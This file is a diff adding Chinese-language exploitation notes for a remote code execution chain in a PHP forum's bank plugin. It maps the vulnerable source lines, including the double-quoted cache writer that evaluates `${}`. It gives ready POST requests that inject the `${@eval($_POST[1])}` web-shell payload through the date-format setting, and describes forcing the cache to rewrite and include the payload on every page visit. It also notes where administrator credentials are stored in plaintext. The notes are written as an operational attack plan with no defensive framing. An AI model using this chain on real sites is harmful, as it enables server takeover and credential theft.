@@ -1,0 +1,33 @@
+# 一、核心可用链（bank_sort RCE）—— 只需等缓存重写窗口
+# hack/bank/example.com:4    require_once(D_P.'data/bbscache/bk_config.php');   // 必须存在，否则 fatal
+# hack/bank/example.com:55   if (!$bk_per || $timestamp - pwFilemtime(D_P."data/bbscache/bank_sort.php") > $bk_per*3600) {
+# hack/bank/example.com:60       $deposit['startdate'] = get_date($deposit['startdate']);   // ★ payload 从 $db_datefm 注入
+# hack/bank/example.com:74       writeover(D_P.'data/bbscache/bank_sort.php',"<?php\r\n".$wirtedb.'?>');
+# hack/bank/example.com:76   include(D_P."data/bbscache/bank_sort.php");              // ★ 同请求 include ⇒ RCE
+# hack/bank/example.com:362-373  function savearray($name,$array){ ... $arraydb .= '"'.addslashes($value2).'",'; }  // 双引号 + 仅 addslashes ⇒ ${} 求值
+
+# 触发 POST（带 payload，命中即落马）
+# POST /bbs/example.com?H_name=bank   body: 1=${@eval($_POST[1])}   ← 用 --data-urlencode 提交
+# 判据：响应出现 PWOK9X / phpinfo 特征；或排行榜表格出现数据行（= 已重写）
+
+# 二、装填 payload（后台 settings，basic 分组有权限时）
+# POST /bbs/example.com?adminjob=settings&admintype=basic   body: step=2&config[datefm]=${@eval($_POST[1])}&<其余字段全量回放>
+# 验证：前台银行页显示 "存款时间:${@eval($_POST[1])} HH:MM"
+
+# 三、即时触发（唯一，需 hackcenter）
+# POST /bbs/example.com?adminjob=hack&hackset=bank&verify=<v>  body: action=unsubmit&config[per]=0&config[num]=10&...
+#   ⇒ hack/bank/example.com:53-62 写 pw_hack.bk_per='0' + 立即 updatecache_bk() ⇒ bk_config.php 里 $bk_per='0'
+#   ⇒ !$bk_per 恒真 ⇒ 每次访问银行页都重写并 include ⇒ 当场 RCE
+
+# 四、判断当前等待窗口（$bk_per 未知时的收敛）
+# 首次访问银行页时间 T0 + $bk_per 小时 = 重写窗口。已知实测：$bk_per>=2 被排除(07:15 未命中)...
+# 常见值 2/6/12/24 ⇒ 窗口 T0+2h / T0+6h / T0+12h / T0+24h
+
+# 五、其它可用的辅助事实
+# - admin/example.com:82  include_once(D_P.'data/sql_config.php');  ⇒ $manager / $manager_pwd 明文所在（拿不到=读不了）
+# - admin/example.com:181 !defined('If_manager') && define('If_manager',0);
+# - admin/example.com:293-324 adminmsg() 末尾 afooter()（会终止执行，实测确认）
+# - require/target105.example.com:231-241 writeover() 内含 touch()（单参数，只更新为当前时间）+ chmod 0777
+# - require/target105.example.com:1057  pwFilemtime() 不存在文件返回 0  ← 删文件的威力所在
+# - admin/cache.php:5-45   updatecache() 全量重建（含 updatecache_bk()），入口 admin/target280.example.com:12 `$_POST['action']=='cache'`
+# - admin/target117.example.com:771-781 updatecache_bk() 读 pw_hack WHERE hk_name LIKE 'bk_%' 写 data/bbscache/bk_config.php
